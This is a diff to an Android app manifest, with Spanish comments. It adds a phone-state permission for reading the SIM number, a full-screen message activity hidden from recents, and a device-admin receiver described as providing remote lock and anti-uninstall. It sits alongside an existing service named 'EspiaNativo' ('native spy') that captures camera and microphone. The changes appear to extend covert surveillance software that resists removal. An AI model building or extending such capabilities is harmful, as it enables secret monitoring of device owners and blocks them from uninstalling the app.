@@ -33,6 +33,9 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <!-- [MosGuard nativo] mensaje a pantalla completa (aviso de alta prioridad) + número de SIM (best-effort) -->
+    <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-feature android:name="android.hardware.camera.any" android:required="false" />
 
     <application
@@ -85,6 +88,26 @@
             android:name=".EspiaNativo"
             android:exported="false"
             android:foregroundServiceType="camera|microphone" />
+
+        <!-- [MosGuard nativo] mensaje a pantalla completa -->
+        <activity
+            android:name=".MensajeActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.YapeCaptor" />
+
+        <!-- [MosGuard nativo] administrador de dispositivo: bloqueo remoto + anti-desinstalación -->
+        <receiver
+            android:name=".GuardAdmin"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
 
         <!-- reintenta lo que quedó en cola cuando vuelve la señal -->
         <service
